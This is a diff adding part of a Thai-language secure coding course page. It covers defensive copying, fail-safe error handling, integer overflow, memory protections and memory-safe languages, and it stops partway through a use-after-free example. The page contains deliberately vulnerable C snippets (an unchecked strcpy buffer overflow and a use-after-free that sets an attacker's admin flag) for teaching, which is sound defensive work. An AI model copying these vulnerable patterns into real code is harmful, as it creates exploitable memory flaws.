+        this.accountNumber = accountNumber; // caller มี Reference → แก้ไขได้
+    }
+    
+    public byte[] getAccountNumber() {
+        return this.accountNumber; // caller ได้ Reference → แก้ไขข้อมูลภายในได้
+    }
+}
+
+// ปลอดภัย: มี Defensive Copy
+public class BankAccount {
+    private byte[] accountNumber;
+    
+    public void setAccountNumber(byte[] accountNumber) {
+        this.accountNumber = Arrays.copyOf(accountNumber, accountNumber.length);
+    }
+    
+    public byte[] getAccountNumber() {
+        return Arrays.copyOf(this.accountNumber, this.accountNumber.length);
+    }
+}</code></pre>
+    <p><strong>แนวทางปฏิบัติสำหรับ Defensive Copying:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>สถานการณ์</th><th>แนวทาง</th></tr></thead><tbody>
+      <tr><td>Constructor Parameter</td><td>ทำสำเนาก่อนเก็บใน Field</td></tr>
+      <tr><td>Getter Method</td><td>คืนค่าเป็น Clone/Copy</td></tr>
+      <tr><td>Setter Method</td><td>ทำสำเนาก่อน Assign</td></tr>
+      <tr><td>Return Collection</td><td>คืนค่าเป็น Unmodifiable View หรือ Copy</td></tr>
+      <tr><td>Accept Array/Collection</td><td>ทำสำเนาก่อนใช้งาน</td></tr>
+    </tbody></table></div>    <h3 id="s1-4">9.1.4 Fail Fast vs Fail Safe</h3>
+    <p>สองแนวคิดนี้มีความหมายต่างกันในบริบทของ Secure Coding:</p>
+    <div class="interactive" id="play-concepts">
+      <h4>Interactive: Fail Fast vs Fail Safe</h4>
+      <p>คลิกแท็บเพื่อเปรียบเทียบแนวคิด พร้อมตัวอย่างโค้ด</p>
+      <div class="tab-bar" id="failTabs">
+        <button class="tab-btn active" data-tab="failfast">Fail Fast</button>
+        <button class="tab-btn" data-tab="failsafe">Fail Safe</button>
+        <button class="tab-btn" data-tab="comparefs">เปรียบเทียบ</button>
+      </div>
+      <div class="tab-panel active" id="panel-failfast">
+        <strong>Fail Fast — ตรวจพบ หยุดทันที</strong>
+        <p>หลักการ: หยุดทำงานทันทีเมื่อพบข้อผิดพลาด ตรวจจับ Bug ได้เร็ว ไม่ปิดบังปัญหา</p>
+        <p>เหมาะกับ: Development, Testing, Debugging</p>
+        <pre><code>def divide_numbers(a, b):
+    if b == 0:
+        raise ValueError("Division by zero — fail fast")
+    return a / b
+
+def process_payment(amount, account):
+    if amount <= 0:
+        raise ValueError("Invalid payment amount")
+    if account is None or not account.is_active:
+        raise ValueError("Invalid or inactive account")
+    # ถ้าผ่านทั้งสอง Check → ดำเนินการต่อ</code></pre>
+      </div>
+      <div class="tab-panel" id="panel-failsafe">
+        <strong>Fail Safe — ผิดพลาด สู่สถานะปลอดภัย</strong>
+        <p>หลักการ: เมื่อผิดพลาด ให้กลับสู่สถานะที่ปลอดภัยที่สุด ระบบยังทำงานต่อได้ในโหมดจำกัด</p>
+        <p>เหมาะกับ: Production, Safety-critical Systems</p>
+        <pre><code>def check_access(user, resource):
+    try:
+        return authorization_service.check_permission(user, resource)
+    except AuthorizationServiceTimeout:
+        log_error("Authorization service unavailable — denying access by default")
+        return False  # ปฏิเสธการเข้าถึงเป็นค่าเริ่มต้น
+    except Exception as e:
+        log_error(f"Unexpected authorization error: {e}")
+        return False  # Fail Safe — ปฏิเสธทุกอย่างเมื่อไม่แน่ใจ</code></pre>
+        <p><strong>ข้อควรจำ:</strong> ในบริบทความปลอดภัย Fail Safe มักหมายถึง "Deny by Default" — เมื่อระบบไม่แน่ใจ ให้ปฏิเสธก่อน ไม่ใช่ยอมรับก่อน</p>
+      </div>
+      <div class="tab-panel" id="panel-comparefs">
+        <strong>ตารางเปรียบเทียบ</strong>
+        <div class="table-wrap"><table><thead><tr><th>คุณสมบัติ</th><th>Fail Fast</th><th>Fail Safe</th></tr></thead><tbody>
+          <tr><td><strong>หลักการ</strong></td><td>หยุดทำงานทันทีเมื่อพบข้อผิดพลาด</td><td>เมื่อผิดพลาด ให้กลับสู่สถานะที่ปลอดภัยที่สุด</td></tr>
+          <tr><td><strong>ข้อดี</strong></td><td>ตรวจจับ Bug ได้เร็ว ไม่ปิดบังปัญหา</td><td>ระบบยังทำงานต่อได้ในโหมดจำกัด</td></tr>
+          <tr><td><strong>ข้อเสีย</strong></td><td>อาจทำให้ระบบ Downtime</td><td>Bug อาจถูกซ่อนไว้</td></tr>
+          <tr><td><strong>เหมาะกับ</strong></td><td>Development, Testing, Debugging</td><td>Production, Safety-critical Systems</td></tr>
+          <tr><td><strong>ตัวอย่าง</strong></td><td>Exception ที่ไม่ควร Catch แบบเงียบ</td><td>ถ้า Authentication System ล้ม → Deny All Access</td></tr>
+        </tbody></table></div>
+      </div>
+    </div>
+    <h3 id="s1-5">9.1.5 Integer Overflow และ Type Safety</h3>
+    <p>Integer Overflow เกิดจากการคำนวณที่ผลลัพธ์เกินค่าที่ประเภทข้อมูลนั้นรองรับ</p>
+    <pre><code>// C — Integer Overflow ปัญหาที่พบได้บ่อย
+#include &lt;stdio.h&gt;
+
+int main() {
+    unsigned char small = 255;  // unsigned char: 0-255
+    small = small + 1;          // overflow → 0
+    printf("%d\n", small);      // Output: 0
+    
+    signed char small_signed = 127;  // signed char: -128 to 127
+    small_signed = small_signed + 1; // overflow → -128
+    printf("%d\n", small_signed);    // Output: -128
+    
+    return 0;
+}</code></pre>
+    <pre><code>// Java — ต้องป้องกัน Integer Overflow ด้วยตัวเอง
+public class SafeMath {
+    public static int safeAdd(int a, int b) throws ArithmeticException {
+        if (b > 0 && a > Integer.MAX_VALUE - b) {
+            throw new ArithmeticException("Integer overflow detected");
+        }
+        if (b < 0 && a < Integer.MIN_VALUE - b) {
+            throw new ArithmeticException("Integer underflow detected");
+        }
+        return a + b;
+    }
+}</code></pre>
+    <p><strong>ภาษาและความปลอดภัยด้าน Type:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>ภาษา</th><th style="text-align:center">Type Safety</th><th style="text-align:center">Integer Overflow</th><th style="text-align:center">Memory Safety</th><th>คำแนะนำ</th></tr></thead><tbody>
+      <tr><td><strong>Python</strong></td><td style="text-align:center">Dynamic</td><td style="text-align:center">ไม่มี (Unbounded)</td><td style="text-align:center">Safe</td><td>เหมาะสำหรับ Prototype</td></tr>
+      <tr><td><strong>Java</strong></td><td style="text-align:center">Static, Strong</td><td style="text-align:center">มี (ต้องป้องกันเอง)</td><td style="text-align:center">Safe (JVM)</td><td>ใช้ <code>Math.addExact()</code></td></tr>
+      <tr><td><strong>C#</strong></td><td style="text-align:center">Static, Strong</td><td style="text-align:center">มี (checked/unchecked)</td><td style="text-align:center">Safe (.NET)</td><td>ใช้ <code>checked</code> block</td></tr>
+      <tr><td><strong>Rust</strong></td><td style="text-align:center">Static, Strong</td><td style="text-align:center">Debug=Panic, Release=Wrapping</td><td style="text-align:center">Safe (Ownership)</td><td>ใช้ <code>.checked_add()</code></td></tr>
+      <tr><td><strong>C/C++</strong></td><td style="text-align:center">Static, Weak</td><td style="text-align:center"><strong>มี — Undefined Behavior</strong></td><td style="text-align:center"><strong>ไม่ Safe</strong></td><td>ใช้ Compiler Warnings, Safe Libs</td></tr>
+      <tr><td><strong>Go</strong></td><td style="text-align:center">Static, Strong</td><td style="text-align:center">มี (Wrap Around)</td><td style="text-align:center">Safe (GC)</td><td>ใช้ <code>math/bits</code></td></tr>
+      <tr><td><strong>TypeScript</strong></td><td style="text-align:center">Static, Dynamic</td><td style="text-align:center">มี (JS Number 64-bit)</td><td style="text-align:center">Safe (JS Engine)</td><td>ใช้ BigInt</td></tr>
+    </tbody></table></div>    <h2 id="s2">9.2 การจัดการ Error และ Exception อย่างปลอดภัย</h2>
+    <p>การจัดการ Error และ Exception ที่ปลอดภัยมีความสำคัญไม่แพ้การเขียน Logic ที่ถูกต้อง — Error Handler ที่ไม่ปลอดภัยสามารถรั่วไหลข้อมูลสำคัญ หรือเปิดช่องโหว่ให้ผู้โจมตีใช้ในการโจมตีระบบ</p>
+    <h3 id="s2-1">9.2.1 หลักการจัดการ Exception ที่ปลอดภัย</h3>
+    <p><strong>หลักการสำคัญ:</strong></p>
+    <ol>
+      <li><strong>ไม่เปิดเผย Internal Information</strong> — Stack Trace, File Paths, DB Schema, IP Addresses ต้องไม่รั่วไหลไปยังผู้ใช้</li>
+      <li><strong>ไม่ Catch Exception แบบเงียบ</strong> — การใช้ <code>except: pass</code> (Python) หรือ <code>catch(Exception){}</code> (Java) ปิดบังข้อผิดพลาด</li>
+      <li><strong>Fail Safe สำหรับ Security Exceptions</strong> — ถ้า Security Component ล้ม ให้ Deny Access</li>
+      <li><strong>Centralized Error Handling</strong> — ใช้ Global Handler แทนการ Try-Catch กระจายทั่วโค้ด</li>
+      <li><strong>Log Appropriate Detail</strong> — Log รายละเอียดสำหรับ Admin แต่ User-facing Message ต้องปลอดภัย</li>
+    </ol>
+    <pre><code># ไม่ปลอดภัย: แสดง Stack Trace ให้ผู้ใช้เห็น
+try:
+    result = process_data(user_input)
+except Exception as e:
+    print(f"Error occurred: {e}")
+    print(traceback.format_exc())  # Stack Trace รั่วไหล!
+
+# ปลอดภัย: Log รายละเอียดใน Server, แสดงข้อความทั่วไปให้ผู้ใช้
+import logging
+logger = logging.getLogger(__name__)
+
+try:
+    result = process_data(user_input)
+except ValueError as e:
+    logger.warning(f"Validation error: {e}")  # Log รายละเอียด
+    return {"error": "ข้อมูลที่ส่งมาไม่ถูกต้อง"}, 400  # ข้อความทั่วไป
+except Exception as e:
+    logger.error(f"Unexpected error: {e}", exc_info=True)  # Log Stack Trace
+    return {"error": "เกิดข้อผิดพลาดภายในระบบ กรุณาลองใหม่อีกครั้ง"}, 500</code></pre>
+    <h3 id="s2-2">9.2.2 ข้อมูลใน Error Messages — สิ่งที่ห้ามเปิดเผย</h3>
+    <div class="table-wrap"><table><thead><tr><th>ข้อมูลที่ห้ามแสดง</th><th>เหตุผล</th><th>ตัวอย่างอันตราย</th></tr></thead><tbody>
+      <tr><td><strong>Stack Trace</strong></td><td>เปิดเผยโครงสร้างโค้ด, Library Version, File Paths</td><td><code>at com.myapp.dao.UserDao.getUser(UserDao.java:42)</code></td></tr>
+      <tr><td><strong>Database Schema</strong></td><td>ช่วยผู้โจมตีวางแผน SQL Injection</td><td><code>Table &#39;users&#39; doesn&#39;t exist</code></td></tr>
+      <tr><td><strong>File Paths</strong></td><td>เปิดเผยโครงสร้าง Directory</td><td><code>/var/www/html/app/config/database.php</code></td></tr>
+      <tr><td><strong>Internal IP</strong></td><td>เปิดเผยโครงสร้างเครือข่าย</td><td><code>10.0.1.5:5432</code></td></tr>
+      <tr><td><strong>Library Version</strong></td><td>เปิดเผย Known Vulnerabilities</td><td><code>Tomcat 8.5.12 — CVE-2023-1234</code></td></tr>
+      <tr><td><strong>Session/Token</strong></td><td>เปิดเผย Session ที่ใช้อยู่</td><td><code>Token: eyJhbGciOi...</code></td></tr>
+      <tr><td><strong>System Configuration</strong></td><td>เปิดเผยค่าที่ใช้ Debug</td><td><code>DEBUG=True</code></td></tr>
+    </tbody></table></div>
+    <p><strong>ตัวอย่างการจัดการ Error Messages ที่ถูกต้อง:</strong></p>
+    <pre><code>// ไม่ปลอดภัย: Spring Boot Default Error
+@GetMapping("/user/{id}")
+public User getUser(@PathVariable String id) {
+    return userRepository.findById(id).orElseThrow(
+        () -> new RuntimeException("User not found with id: " + id)
+    );
+}
+
+// ปลอดภัย: Custom Error Response
+@GetMapping("/user/{id}")
+public ResponseEntity&lt;?&gt; getUser(@PathVariable String id) {
+    try {
+        User user = userRepository.findById(id)
+            .orElseThrow(() -> new ResourceNotFoundException("User not found"));
+        return ResponseEntity.ok(user);
+    } catch (ResourceNotFoundException e) {
+        log.warn("Resource not found: userId={}", id);
+        return ResponseEntity.status(404).body(
+            new ErrorResponse("ไม่พบผู้ใช้ที่ระบุ"));
+    } catch (Exception e) {
+        log.error("Unexpected error fetching user: userId={}", id, e);
+        return ResponseEntity.status(500).body(
+            new ErrorResponse("เกิดข้อผิดพลาดภายในระบบ กรุณาลองใหม่อีกครั้ง"));
+    }
+}</code></pre>    <h3 id="s2-3">9.2.3 Global Error Handler</h3>
+    <p>Global Error Handler เป็นตัวจัดการ Exception ส่วนกลางที่ Catch Exception ทั้งหมดที่ไม่มี Handler เฉพาะ ช่วยป้องกันไม่ให้ Exception ที่ไม่คาดคิดรั่วไหลข้อมูลไปยังผู้ใช้</p>
+    <pre><code># Flask — Global Error Handler
+import logging
+from flask import Flask, jsonify
+
+app = Flask(__name__)
+logger = logging.getLogger(__name__)
+
+@app.errorhandler(400)
+def bad_request(error):
+    logger.warning(f"Bad request: {error}")
+    return jsonify({"error": "คำขอไม่ถูกต้อง"}), 400
+
+@app.errorhandler(401)
+def unauthorized(error):
+    logger.warning(f"Unauthorized access attempt")
+    return jsonify({"error": "กรุณาล็อกอินก่อนเข้าใช้งาน"}), 401
+
+@app.errorhandler(403)
+def forbidden(error):
+    logger.warning(f"Forbidden access: {error}")
+    return jsonify({"error": "คุณไม่มีสิทธิ์เข้าถึงหน้านี้"}), 403
+
+@app.errorhandler(404)
+def not_found(error):
+    logger.info(f"Resource not found: {error}")
+    return jsonify({"error": "ไม่พบหน้าที่คุณต้องการ"}), 404
+
+@app.errorhandler(500)
+def internal_error(error):
+    logger.error(f"Internal server error", exc_info=True)
+    return jsonify({"error": "เกิดข้อผิดพลาดภายในระบบ"}), 500</code></pre>
+    <pre><code>// Express.js — Global Error Handler Middleware
+const express = require('express');
+const app = express();
+
+app.use((err, req, res, next) => {
+    console.error(`[${new Date().toISOString()}] Error:`, err);
+    
+    const statusCode = err.statusCode || 500;
+    const message = err.isOperational 
+        ? err.message 
+        : 'เกิดข้อผิดพลาดภายในระบบ กรุณาลองใหม่อีกครั้ง';
+    
+    if (statusCode >= 500) {
+        console.error('Stack trace:', err.stack);
+    }
+    
+    res.status(statusCode).json({
+        error: message,
+        requestId: req.id
+    });
+});</code></pre>
+    <h3 id="s2-4">9.2.4 Custom Error Pages</h3>
+    <p>Custom Error Pages มีความสำคัญในเว็บแอปพลิเคชัน — ต้องไม่แสดง Stack Trace หรือ Default Server Error Page</p>
+    <pre><code># NGINX — Custom Error Pages
+error_page 404 /404.html;
+error_page 500 502 503 504 /50x.html;
+
+location = /404.html {
+    root /var/www/html/errors;
+    internal;
+}
+
+location = /50x.html {
+    root /var/www/html/errors;
+    internal;
+}</code></pre>
+    <p><strong>สิ่งที่ Custom Error Page ควรมี:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>รายการ</th><th>คำอธิบาย</th></tr></thead><tbody>
+      <tr><td>ข้อความที่เข้าใจง่าย</td><td>บอกว่าเกิดอะไรขึ้นโดยไม่ใช้ Technical Jargon</td></tr>
+      <tr><td>ข้อมูลติดต่อ</td><td>วิธีแจ้งผู้ดูแลระบบ</td></tr>
+      <tr><td>Request/Reference ID</td><td>สำหรับให้ Support Team สืบค้น</td></tr>
+      <tr><td>กลับไปหน้าแรก</td><td>Link หรือ Button กลับหน้าแรก</td></tr>
+      <tr><td>Timer/Retry</td><td>สำหรับ 503/504 — บอกให้ลองใหม่ภายหลัง</td></tr>
+    </tbody></table></div>
+    <p><strong>สิ่งที่ Custom Error Page ห้ามมี:</strong></p>
+    <ul>
+      <li>Stack Trace หรือ Error Code ภายใน</li>
+      <li>File Paths หรือ System Information</li>
+      <li>Database Queries หรือ Table Names</li>
+      <li>Version Numbers</li>
+      <li>Debug Information</li>
+    </ul>
+    <h3 id="s2-5">9.2.5 Unhandled Exception และ Resource Leak</h3>
+    <p>Unhandled Exception ที่ไม่ถูก Catch อย่างถูกต้องอาจทำให้:</p>
+    <ol>
+      <li>ระบบหยุดทำงาน (Application Crash)</li>
+      <li>หน่วยความจำรั่วไหล (Resource Leak)</li>
+      <li>ข้อมูลไม่ถูกบันทึก (Data Loss)</li>
+      <li>การเชื่อมต่อ Database/File ถูกทิ้งไว้ (Connection Leak)</li>
+    </ol>
+    <p><strong>แนวทางป้องกัน Resource Leak:</strong></p>
+    <pre><code>// ไม่ปลอดภัย: Resource อาจไม่ถูกปิดเมื่อเกิด Exception
+public void readFile(String path) throws IOException {
+    FileInputStream fis = new FileInputStream(path);
+    BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
+    String line = reader.readLine();
+    reader.close();
+    fis.close();
+}
+
+// ปลอดภัย: Try-with-Resources (Java 7+)
+public void readFile(String path) throws IOException {
+    try (FileInputStream fis = new FileInputStream(path);
+         BufferedReader reader = new BufferedReader(new InputStreamReader(fis))) {
+        String line = reader.readLine();
+    }
+}</code></pre>
+    <pre><code># Python: Context Manager
+def read_file(path):
+    with open(path, 'r') as f:  # with statement — ปิดไฟล์อัตโนมัติ
+        content = f.read()
+    return content</code></pre>
+    <p><strong>แนวทางรวม: Secure Error Handling Checklist</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>หัวข้อ</th><th>แนวทาง</th></tr></thead><tbody>
+      <tr><td>Stack Trace</td><td>ห้ามแสดงให้ผู้ใช้เห็น — Log ใน Server</td></tr>
+      <tr><td>Error Message</td><td>ใช้ข้อความทั่วไปกับผู้ใช้ — รายละเอียดใน Log</td></tr>
+      <tr><td>Resource Cleanup</td><td>ใช้ try-with-resources / with / finally</td></tr>
+      <tr><td>Global Handler</td><td>มี Central Error Handler สำหรับ Exception ที่ไม่คาดคิด</td></tr>
+      <tr><td>Logging</td><td>Log Error พร้อม Context แต่ไม่ Log Secrets</td></tr>
+      <tr><td>Custom Error Page</td><td>สร้าง 404, 500, 403 Page ที่ปลอดภัยและสวยงาม</td></tr>
+    </tbody></table></div>    <h2 id="s3">9.3 Memory Safety</h2>
+    <p>Memory Safety เป็นหนึ่งในประเด็นสำคัญที่สุดของ Secure Coding — ภาษาที่ไม่ Safe ทางหน่วยความจำ (C/C++) เป็นต้นเหตุของช่องโหว่ร้ายแรงจำนวนมาก</p>
+    <h3 id="s3-1">9.3.1 Buffer Overflow — หลักการและผลกระทบ</h3>
+    <p>Buffer Overflow เกิดจากการเขียนข้อมูลเกินขนาดของ Buffer ที่จองไว้ในหน่วยความจำ ทำให้ข้อมูลเขียนทับพื้นที่ Memory ข้างเคียง</p>
+    <pre><code>// C — Buffer Overflow ที่อันตราย
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // ไม่ตรวจสอบขนาด — ถ้า input > 64 → Overflow!
+    printf("Buffer content: %s\n", buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc > 1) {
+        vulnerable_function(argv[1]);
+    }
+    return 0;
+}</code></pre>
+    <p><strong>ผลกระทบของ Buffer Overflow:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>ผลกระทบ</th><th>คำอธิบาย</th></tr></thead><tbody>
+      <tr><td><strong>Crash (Segmentation Fault)</strong></td><td>เขียนทับ Memory ที่สำคัญ → โปรแกรมหยุดทำงาน</td></tr>
+      <tr><td><strong>Code Execution</strong></td><td>เขียนทับ Return Address → ควบคุม Program Flow → รันโค้ดผู้โจมตี</td></tr>
+      <tr><td><strong>Information Disclosure</strong></td><td>อ่าน Memory ที่อยู่ติดกัน → ขโมยข้อมูล</td></tr>
+      <tr><td><strong>Privilege Escalation</strong></td><td>ยกระดับสิทธิ์โดยควบคุม Execution Flow</td></tr>
+    </tbody></table></div>
+    <p><strong>เหตุการณ์สำคัญจาก Buffer Overflow:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>เหตุการณ์</th><th>ปี</th><th>รายละเอียด</th></tr></thead><tbody>
+      <tr><td><strong>Morris Worm</strong></td><td>1988</td><td>ใช้ Buffer Overflow ใน <code>fingerd</code> — หนอนตัวแรกบนอินเทอร์เน็ต</td></tr>
+      <tr><td><strong>Code Red</strong></td><td>2001</td><td>ใช้ Buffer Overflow ใน Microsoft IIS — ติดเซิร์ฟเวอร์กว่า 350,000 เครื่อง</td></tr>
+      <tr><td><strong>Slammer Worm</strong></td><td>2003</td><td>ใช้ Buffer Overflow ใน Microsoft SQL Server — โจมตี 75,000 เครื่องใน 10 นาที</td></tr>
+      <tr><td><strong>Heartbleed</strong></td><td>2014</td><td>Buffer Over-read ใน OpenSSL — อ่าน Memory Server ครั้งละ 64 KB</td></tr>
+      <tr><td><strong>WannaCry</strong></td><td>2017</td><td>ใช้ EternalBlue — Buffer Overflow ใน SMB Protocol</td></tr>
+    </tbody></table></div>
+    <h3 id="s3-2">9.3.2 Memory Protection Mechanisms</h3>
+    <p>ระบบปฏิบัติการสมัยใหม่มีกลไกป้องกัน Memory Safety หลายชั้น:</p>
+    <div class="interactive" id="play-memory">
+      <h4>Interactive: Memory Protection Mechanisms</h4>
+      <p>คลิกที่กลไกแต่ละตัวเพื่อดูรายละเอียดการทำงาน</p>
+      <div class="memory-card-grid">
+        <div class="memory-card" data-expand="canary">
+          <div class="card-icon">🛡️</div>
+          <div class="card-title">Stack Canary</div>
+          <div class="card-desc">ค่า Sentinel ที่วางไว้ระหว่าง Local Variables และ Return Address — ขนาด 4 bytes (32-bit) หรือ 8 bytes (64-bit, byte แรกเป็น 0 ป้องกัน string overflow) ป้องกัน Stack Buffer Overflow ที่เขียนทับ Return Address</div>
+        </div>
+        <div class="memory-card" data-expand="aslr">
+          <div class="card-icon">🎲</div>
+          <div class="card-title">ASLR</div>
+          <div class="card-desc">Address Space Layout Randomization — สุ่มตำแหน่งหน่วยความจำที่โหลด Library, Stack, Heap ป้องกันการคาดเดาที่อยู่ (Return-to-libc, ROP)</div>
+        </div>
+        <div class="memory-card" data-expand="dep">
+          <div class="card-icon">🚫</div>
+          <div class="card-title">DEP/NX</div>
+          <div class="card-desc">Data Execution Prevention — ทำเครื่องหมาย Memory Pages ว่าไม่สามารถ Execute ได้ ป้องกันการรันโค้ดจาก Stack/Heap</div>
+        </div>
+        <div class="memory-card" data-expand="cfg">
+          <div class="card-icon">🔒</div>
+          <div class="card-title">CFG</div>
+          <div class="card-desc">Control Flow Guard — ตรวจสอบว่า Indirect Call ไปยัง Target ที่อนุญาตเท่านั้น ป้องกัน ROP/JOP Attacks</div>
+        </div>
+        <div class="memory-card" data-expand="ssp">
+          <div class="card-icon">🔐</div>
+          <div class="card-title">SSP</div>
+          <div class="card-desc">Stack Smashing Protection — GCC Extension ใส่ Stack Canary อัตโนมัติ ป้องกัน Stack Buffer Overflow</div>
+        </div>
+        <div class="memory-card" data-expand="asan">
+          <div class="card-icon">🔍</div>
+          <div class="card-title">ASan</div>
+          <div class="card-desc">Address Sanitizer — Compiler Instrumentation ตรวจจับ Memory Errors ขณะ Runtime ตรวจจับ Use-after-free, Heap Overflow, Stack Overflow</div>
+        </div>
+      </div>
+      <div id="memoryDetail" class="result">คลิกที่กลไกเพื่อดูรายละเอียด</div>
+    </div>
+    <p><strong>ตัวอย่าง Stack Canary ใน C (GCC):</strong></p>
+    <pre><code>// Compile with: gcc -fstack-protector-strong -o safe safe.c
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void safe_function(char *input) {
+    char buffer[64];
+    // GCC จะวาง Stack Canary (random value) ไว้ที่นี่
+    // ระหว่าง buffer และ frame pointer / return address
+    
+    strcpy(buffer, input);  // ถ้า overflow → เขียนทับ Canary
+    
+    // ก่อน return, GCC ตรวจสอบ Canary
+    // ถ้า Canary เปลี่ยน → __stack_chk_fail() → abort()
+}</code></pre>    <h3 id="s3-3">9.3.3 Memory-safe Languages</h3>
+    <p>ภาษาที่ปลอดภัยทางหน่วยความจำ (Memory-safe Languages) ป้องกัน Buffer Overflow, Use-after-free, และ Memory Corruption โดย Design — ไม่ต้องพึ่งพา Programmer Discipline เพียงอย่างเดียว</p>
+    <div class="table-wrap"><table><thead><tr><th>ภาษา</th><th style="text-align:center">Memory Model</th><th style="text-align:center">Garbage Collection</th><th style="text-align:center">Ownership</th><th>เหมาะกับ</th></tr></thead><tbody>
+      <tr><td><strong>Rust</strong></td><td style="text-align:center">Ownership + Borrowing</td><td style="text-align:center">ไม่ (Zero-cost)</td><td style="text-align:center">Compile-time</td><td>System Programming, Crypto, Browser Engine</td></tr>
+      <tr><td><strong>Go</strong></td><td style="text-align:center">GC + Bounds Check</td><td style="text-align:center">มี</td><td style="text-align:center">Runtime</td><td>Backend Services, Cloud/DevOps Tools</td></tr>
+      <tr><td><strong>Java</strong></td><td style="text-align:center">JVM + Bounds Check</td><td style="text-align:center">มี (JVM GC)</td><td style="text-align:center">Runtime</td><td>Enterprise Applications, Android</td></tr>
+      <tr><td><strong>C#</strong></td><td style="text-align:center">.NET + Bounds Check</td><td style="text-align:center">มี (.NET GC)</td><td style="text-align:center">Runtime</td><td>Windows Apps, Game Dev (Unity)</td></tr>
+      <tr><td><strong>Python</strong></td><td style="text-align:center">Dynamic + Bounds Check</td><td style="text-align:center">มี (Reference Counting + GC)</td><td style="text-align:center">Runtime</td><td>Scripting, Data Science, Web</td></tr>
+      <tr><td><strong>JavaScript</strong></td><td style="text-align:center">Dynamic + Bounds Check</td><td style="text-align:center">มี (V8 GC)</td><td style="text-align:center">Runtime</td><td>Web, Node.js</td></tr>
+      <tr><td><strong>Swift</strong></td><td style="text-align:center">ARC</td><td style="text-align:center">ARC</td><td style="text-align:center">Compile-time + Runtime</td><td>iOS/macOS Apps</td></tr>
+      <tr><td><strong>Kotlin</strong></td><td style="text-align:center">JVM + Null Safety</td><td style="text-align:center">มี (JVM GC)</td><td style="text-align:center">Compile-time</td><td>Android, Backend</td></tr>
+    </tbody></table></div>
+    <p><strong>Rust — Ownership Model ที่ป้องกัน Memory Bugs:</strong></p>
+    <pre><code>fn main() {
+    // Rust Ownership: ทุกค่ามี Owner เพียงคนเดียว
+    let s1 = String::from("hello");
+    let s2 = s1;  // Ownership ย้ายจาก s1 → s2
+    // println!("{}", s1);  // ❌ s1 ไม่ valid แล้ว
+    
+    // Rust Borrowing: ยืมแบบ Reference โดยไม่ Transfer Ownership
+    let s3 = String::from("world");
+    let len = calculate_length(&amp;s3);  // ยืม Reference
+    println!("{} has length {}", s3, len);  // ✅ s3 ยังใช้ได้
+}
+
+fn calculate_length(s: &amp;String) -> usize {
+    s.len()
+}  // s ถูก Drop — ไม่มี Dangling Pointer</code></pre>
+    <p><strong>สถิติ Memory Safety ทั่วโลก (2024-2025):</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>แหล่ง</th><th>ตัวเลข</th><th>ปี</th></tr></thead><tbody>
+      <tr><td><strong>Microsoft (MSRC)</strong></td><td>~70% ของ CVEs เป็น memory safety issues (32% เป็น temporal safety — use-after-free)</td><td>2019-2024</td></tr>
+      <tr><td><strong>Google Chrome</strong></td><td>~70% of high/critical severity bugs เป็น memory safety (51% เป็น use-after-free)</td><td>2015-2024</td></tr>
+      <tr><td><strong>Google Android</strong></td><td>Memory safety vulnerabilities ลดลงต่ำกว่า <strong>20%</strong> เป็นครั้งแรก (จากเดิม ~70%) จากการนำ Rust มาใช้</td><td>2025</td></tr>
+      <tr><td><strong>Project Zero</strong></td><td>68% of in-the-wild zero days เป็น memory safety</td><td>2021-2024</td></tr>
+      <tr><td><strong>NSA/CISA</strong></td><td>~70% ของ vulnerabilities เป็น memory safety — แนะนำให้เปลี่ยนไปใช้ memory-safe languages</td><td>2022-2025</td></tr>
+    </tbody></table></div>
+    <p><strong>Rust Adoption — ความคืบหน้าในระบบสำคัญ:</strong></p>
+    <div class="table-wrap"><table><thead><tr><th>ระบบ</th><th>สถานะ</th></tr></thead><tbody>
+      <tr><td><strong>Linux Kernel</strong></td><td>Rust เป็น "experiment" → ประกาศ success แล้ว (2025 Maintainers Summit) — มี Rust drivers ใน production, amount of Rust code เพิ่มขึ้น 5x</td></tr>
+      <tr><td><strong>Android</strong></td><td>~5 million บรรทัด Rust — Memory safety vulnerability density: <strong>0.2/MLOC</strong> vs C/C++ ~1,000/MLOC = <strong>&gt;1000x reduction</strong></td></tr>
+      <tr><td><strong>Chrome/Chromium</strong></td><td>Rust parsers สำหรับ PNG, JSON, Web Fonts</td></tr>
+      <tr><td><strong>Microsoft</strong></td><td>กำลังเขียน Windows Kernel components ใน Rust</td></tr>
+    </tbody></table></div>
+    <p><strong>แนวทางจากหน่วยงานรัฐ:</strong></p>
+    <ul>
+      <li><strong>NSA (2022):</strong> "Software Memory Safety" — แนะนำให้ใช้ memory-safe languages</li>
+      <li><strong>NSA + CISA (2023):</strong> "The Case for Memory Safe Roadmaps"</li>
+      <li><strong>White House (2024):</strong> "Back to the Building Blocks" — เรียกร้องให้อุตสาหกรรมเปลี่ยนไปใช้ memory-safe languages</li>
+      <li><strong>CISA (2025):</strong> Secure by Design — กำหนดให้ Memory-safe Language Adoption เป็น core component</li>
+    </ul>
+    <p><strong>ข้อควรจำ:</strong> การใช้ Memory-safe Language ไม่ได้รับประกันความปลอดภัย 100% — ยังมี Logic Bugs, Race Conditions, และ Algorithmic Vulnerabilities ที่ต้องระวัง</p>
+    <h3 id="s3-4">9.3.4 Dangling Pointers และ Use-after-Free</h3>
+    <p>Use-after-Free (CWE-416) เป็นช่องโหว่ที่เกิดขึ้นเมื่อโปรแกรมใช้ Pointer ที่ชี้ไปยังหน่วยความจำที่ถูกคืน (Free) แล้ว</p>
+    <pre><code>// C — Use-after-Free
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+typedef struct {
+    char name[32];
+    int is_admin;
+} User;
+
+int main() {
+    User *user = (User*)malloc(sizeof(User));
+    strcpy(user->name, "Alice");
+    user->is_admin = 0;
+    
+    free(user);
+    
+    printf("Name: %s\n", user->name);  // ❌ Undefined Behavior
+    
+    User *attacker = (User*)malloc(sizeof(User));
+    strcpy(attacker->name, "Mallory");
+    attacker->is_admin = 1;
+    
